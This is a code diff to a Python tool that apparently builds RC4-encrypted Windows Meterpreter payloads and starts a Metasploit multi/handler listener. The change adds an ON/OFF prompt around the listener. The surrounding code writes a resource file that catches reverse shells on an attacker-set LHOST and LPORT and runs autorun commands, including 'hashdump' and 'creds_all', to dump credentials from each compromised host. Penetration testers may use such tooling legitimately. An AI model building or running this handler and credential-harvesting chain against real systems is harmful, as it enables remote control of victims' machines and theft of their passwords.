@@ -55,19 +55,25 @@ def autorunscript():
 				 "hashdump\n"+\
 				 "creds_all")
 
-def listener(msfPayload,lhost,lport,rc4Password): 
+def listener(msfPayload,lhost,lport,rc4Password, msflistenerChoice): 
 	#Creates resource file(with autorunscripts builtin) and launches listener.
-	with open(filerc4listener, 'w') as f:
-		f.write("use multi/handler"+"\n"+\
-				"set PAYLOAD windows/meterpreter/"+msfPayload+"\n"+\
-				"set LHOST "+lhost+"\n"+\
-				"set LPORT "+lport+"\n"+\
-				"set Rc4PASSWORD "+rc4Password+""+"\n"+\
-				"set ExitOnSession false"+"\n"+\
-				"set AutoRunScript multi_console_command -rc"+fileAutoscript+"\n"+\
-				"exploit -j -z")
-	os.system('msfconsole -q -r '+filerc4listener)
-	sys.exit(2)
+	on = set(['on','yes', 'ye', ''])
+	off = set(['off','no'])
+	if msflistenerChoice in on:
+		with open(filerc4listener, 'w') as f:
+			f.write("use multi/handler"+"\n"+\
+					"set PAYLOAD windows/meterpreter/"+msfPayload+"\n"+\
+					"set LHOST "+lhost+"\n"+\
+					"set LPORT "+lport+"\n"+\
+					"set Rc4PASSWORD "+rc4Password+""+"\n"+\
+					"set ExitOnSession false"+"\n"+\
+					"set AutoRunScript multi_console_command -rc"+fileAutoscript+"\n"+\
+					"exploit -j -z")
+		os.system('msfconsole -q -r '+filerc4listener)
+	elif msflistenerChoice in off:
+		sys.exit(2)
+	else:
+		sys.stdout.write("Please respond with 'ON' or 'OFF'")
 
 def help():
 	print(
@@ -111,7 +117,7 @@ def main(argv):
     	msfListener = raw_input('listener[ON]:') or 'ON'
     	msfListenerChoice = msfListener.lower()
     	print('ENTERED: "%s"' % msfListenerChoice.upper() + '\n')
-    	listener(msfPayload,lhost,lport,rc4Password)
+    	listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)
 
     else:
     	try:
@@ -133,7 +139,7 @@ def main(argv):
         		elif opt in ('-e','--listener'): 
         			if arg == "on":
         				payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
-        				listener(msfPayload,lhost,lport,rc4Password)
+        				listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)
         		else:
         			help()
         			sys.exit(2)
